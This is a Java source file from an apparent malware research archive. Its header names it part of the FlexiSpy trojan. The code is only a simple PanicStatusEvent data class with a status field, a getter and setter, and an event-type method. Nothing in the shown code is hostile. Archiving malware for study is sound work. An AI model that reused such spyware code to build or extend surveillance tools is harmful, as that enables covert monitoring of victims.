/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.event;

public class PanicStatusEvent extends PEvent {

	private PanicStatusCode status =  PanicStatusCode.UNKNOWN;
	
	public void setStatus(PanicStatusCode status) {
		this.status = status;
	}
	
	public PanicStatusCode getStatus() {
		return status;
	}
	
	public EventType getEventType() {
		return EventType.PANIC_STATUS;
	}
}
